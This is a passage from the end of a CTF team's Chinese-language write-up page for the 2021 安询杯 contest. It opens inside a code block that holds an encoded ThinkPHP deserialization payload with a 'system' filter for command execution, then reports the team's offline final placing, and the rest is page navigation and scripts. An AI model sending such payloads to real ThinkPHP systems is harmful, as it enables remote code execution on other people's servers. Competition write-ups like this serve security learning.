class="number">086</span>MTM<span class="number">6</span>InRoaW<span class="number">5</span>rXFJlcXVlc<span class="number">3</span>QiOjM<span class="number">6</span>e<span class="number">1</span>M<span class="number">6</span>NzoiXDAwKlwwMGhvb<span class="number">2</span>siO<span class="number">2</span>E<span class="number">6</span>MTp<span class="number">7</span>Uzo<span class="number">3</span>OiJ<span class="number">2</span>aXNpYmxlIjthOjI<span class="number">6</span>e<span class="number">2</span>k<span class="number">6</span>MDtyOjk<span class="number">7</span>aToxO<span class="number">1</span>M<span class="number">6</span>NjoiaXNBamF<span class="number">4</span>Ijt<span class="number">9</span>fVM<span class="number">6</span>OToiXDAwKlwwMGZpbHRlciI<span class="number">7</span>Uzo<span class="number">2</span>OiJzeXN<span class="number">0</span>ZW<span class="number">0</span>iO<span class="number">1</span>M<span class="number">6</span>OToiXDAwKlwwMGNvbmZpZyI<span class="number">7</span>YToxOntTOjg<span class="number">6</span>InZhcl<span class="number">9</span>hamF<span class="number">4</span>IjtTOjM<span class="number">6</span>ImxpbiI<span class="number">7</span>fX<span class="number">19</span>fX<span class="number">19</span></span></span><br><span class="line"><span class="apache"></span></span><br></pre></td></tr></table></figure>



<h2 id="补充：线下战报"><a href="#补充：线下战报" class="headerlink" title="补充：线下战报"></a>补充：线下战报</h2><p>安询杯线下决赛取得第二名，获得一等奖。<br><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/1a0167c232810bd5.jpg"></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2021安询杯wp</p><p><a href="https://wp.n03tack.top/posts/4906/">https://wp.n03tack.top/posts/4906/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="https://wp.n03tack.top"><p>n03tAck</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-11-28</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-12-17</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/posts/15611/" target="_blank">2021NCTF比赛WP</a><br></span><span>  2.<a class="is-size-6" href="/posts/14620/" target="_blank">2021陇原战疫WP</a><br></span><span>  3.<a class="is-size-6" href="/posts/5066/" target="_blank">2021bytectf线上WP</a><br></span><span>  4.<a class="is-size-6" href="/posts/47585/" target="_blank">2021绿城杯wp</a><br></span><span>  5.<a class="is-size-6" href="/posts/11556/" target="_blank">2021第一届长城杯网络安全大赛WP</a><br></span><span>  6.<a class="is-size-6" href="/posts/56002/" target="_blank">2021第五空间大赛WP</a><br></span><span>  7.<a class="is-size-6" href="/posts/1010/" target="_blank">2021网刃杯WP</a><br></span><span>  8.<a class="is-size-6" href="/posts/62454/" target="_blank">2021第二届祥云杯WP</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/7D1F151CCE01A9E6F955D3AD0195257F.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/5528B1622BD2CEB3A2EF095643DE9949.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/15611/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021NCTF比赛WP</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/14620/"><span class="level-item">2021陇原战疫WP</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="is-flex is-mobile" href="#Misc"><span>Misc</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#应该算是签到"><span>应该算是签到</span></a></li><li><a class="is-flex is-mobile" href="#CyzCC-loves-LOL"><span>CyzCC_loves_LOL</span></a></li><li><a class="is-flex is-mobile" href="#Cthulhu-Mythos"><span>Cthulhu Mythos</span></a></li><li><a class="is-flex is-mobile" href="#lovemath"><span>lovemath</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Pwn"><span>Pwn</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#stack"><span>stack</span></a></li><li><a class="is-flex is-mobile" href="#noleak"><span>noleak</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Re"><span>Re</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#sign-in"><span>sign_in</span></a></li><li><a class="is-flex is-mobile" href="#virtus"><span>virtus</span></a></li><li><a class="is-flex is-mobile" href="#Mazeeee"><span>Mazeeee</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Crypto"><span>Crypto</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#little-trick"><span>little_trick</span></a></li><li><a class="is-flex is-mobile" href="#ez-equation"><span>ez_equation</span></a></li><li><a class="is-flex is-mobile" href="#Strange"><span>Strange</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Web"><span>Web</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#Ez-TP"><span>Ez_TP</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#补充：线下战报"><span>补充：线下战报</span></a></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/logo.png" alt="n03tAck"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">n03tAck</p><p class="is-size-6 is-block">n03tAck战队writeup</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">10</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">1</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/dota-st" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/admin@wlhhlc.top"><i class="fa fa-envelope"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.wlhhlc.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">dota_st</span></span><span class="level-right"><span class="level-item tag">www.wlhhlc.top</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-29T09:18:48.000Z">2021-11-29</time></p><p class="title"><a href="/posts/15611/">2021NCTF比赛WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-28T07:11:45.000Z">2021-11-28</time></p><p class="title"><a href="/posts/4906/">2021安询杯wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-08T01:41:17.000Z">2021-11-08</time></p><p class="title"><a href="/posts/14620/">2021陇原战疫WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-19T14:11:59.000Z">2021-10-19</time></p><p class="title"><a href="/posts/5066/">2021bytectf线上WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-30T04:23:00.000Z">2021-09-30</time></p><p class="title"><a href="/posts/47585/">2021绿城杯wp</a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/WP/"><span class="tag">WP</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a><p class="size-small"><span>&copy; 2021 n03tAck</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容创作权归属n03tAck战队所有]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
        }var now = new Date();setInterval("createTime('2021/08/19 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(true){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script><script type="text/javascript">function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };loadMathJax();</script></body></html>